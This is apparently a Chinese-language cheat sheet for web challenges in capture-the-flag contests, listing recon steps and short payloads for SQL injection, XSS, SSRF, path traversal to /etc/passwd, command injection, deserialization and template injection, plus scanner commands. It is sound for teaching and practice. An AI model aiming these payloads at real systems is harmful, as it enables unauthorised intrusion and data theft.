# Web 解题套路

## 通用流程

1. **查看源码** - 注释、隐藏字段、JS 文件
2. **查看响应头** - Server、X-Powered-By、自定义头
3. **目录扫描** - `gobuster dir -u URL -w wordlist`
4. ** robots.txt / sitemap.xml** - 泄露路径
5. **cookie 分析** - 可解码 JWT、base64

## SQL 注入

### 检测
```bash
sqlmap -u "http://target/page?id=1" --batch
```

### 手工要点
- 字符型：`' OR 1=1 --`
- 数字型：`1 OR 1=1`
- 联合查询：`UNION SELECT 1,2,3`
- 盲注：`SUBSTRING((SELECT ...),1,1)='a'`

## XSS

### 反射型
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`

### DOM 型
- 查看源码中的 `document.write`、`innerHTML`

### 存储型
- 留言板、评论框

## SSRF

### 常见参数名
- url、target、host、image、source

### 利用
- 读内网：`http://127.0.0.1/`
- 读文件：`file:///etc/passwd`
- gopher 协议打 Redis/MySQL

## 文件包含 / LFI

```bash
# 读 /etc/passwd
http://target/page?file=../../../../etc/passwd

# PHP 伪协议
php://filter/convert.base64-encode/resource=index.php
```

## 命令注入

```bash
# 常见分隔符
; | && || %0a %0d
# 常见命令
id | whoami | cat /flag
```

## 反序列化

### PHP
- `__wakeup`、`__destruct` 魔术方法
- 构造 POP 链

### Java
- ysoserial 工具
- 常见 gadget：CommonsCollections

## SSTI（模板注入）

```bash
# 检测
{{7*7}}  → 49

# Jinja2 RCE
{{''.__class__.__mro__[1].__subclasses__()}}
```

## 常用工具

```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
sqlmap -u "URL" --batch --dbs
nikto -h http://target
wfuzz -c -w wordlist --hc 404 http://target/FUZZ
```

## 解题流程

1. 浏览目标，看源码和响应头
2. 识别技术栈（PHP/Java/Node）
3. 找注入点（参数、cookie、header）
4. 尝试对应攻击
5. 获取 flag
